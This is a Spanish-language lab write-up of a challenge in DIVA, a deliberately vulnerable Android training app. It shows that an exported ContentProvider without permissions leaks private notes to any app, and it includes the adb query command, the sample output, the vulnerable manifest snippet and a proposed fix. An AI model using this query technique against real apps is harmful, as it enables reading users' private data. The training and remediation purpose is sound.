# Desafío 10 — Access Control Issues (Part 3) — ContentProvider expuesto

**Procedimiento:**
1. Revisión del AndroidManifest: `NotesProvider` declarado con `android:exported="true"`, authority `jakhar.aseem.diva.provider.notesprovider`, sin atributo `android:permission` ni `readPermission`/`writePermission`.
2. Revisión de `NotesProvider.java`: `query()` no implementa ninguna verificación del llamador (`getCallingPackage()`/`checkCallingPermission`).
3. Consulta directa al provider desde fuera de la app, como lo haría cualquier app de terceros:
```
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes
```

**Resultado observado:** Las 6 notas privadas del usuario quedan expuestas:
```
Row: 0 _id=5, title=Exercise, note=Alternate days running
Row: 1 _id=4, title=Expense, note=Spent too much on home theater
Row: 2 _id=6, title=Weekend, note=b333333333333r
Row: 3 _id=3, title=holiday, note=Either Goa or Amsterdam
Row: 4 _id=2, title=home, note=Buy toys for baby, Order dinner
Row: 5 _id=1, title=office, note=10 Meetings. 5 Calls. Lunch with CEO
```

**Código vulnerable:** [`AndroidManifest.xml`](../../../../diva-source/app/src/main/AndroidManifest.xml):
```xml
<provider android:name=".NotesProvider"
    android:authorities="jakhar.aseem.diva.provider.notesprovider"
    android:enabled="true"
    android:exported="true" >
</provider>
```
[`NotesProvider.java`](../../../../diva-source/app/src/main/java/jakhar/aseem/diva/NotesProvider.java) — `query()`/`insert()`/`update()`/`delete()` sin control de acceso.

**Evidencia:** `01_notas_filtradas.txt`.

**Impacto:** Lectura (y, revisando el código, también escritura/eliminación) de información personal del usuario por cualquier app instalada en el dispositivo, sin permisos ni interacción del usuario.

**Corrección propuesta:** `android:exported="false"` si el provider es de uso exclusivamente interno; si debe compartirse, proteger con `android:permission` (permiso `signature`) y validar explícitamente `getCallingPackage()` en cada operación CRUD.
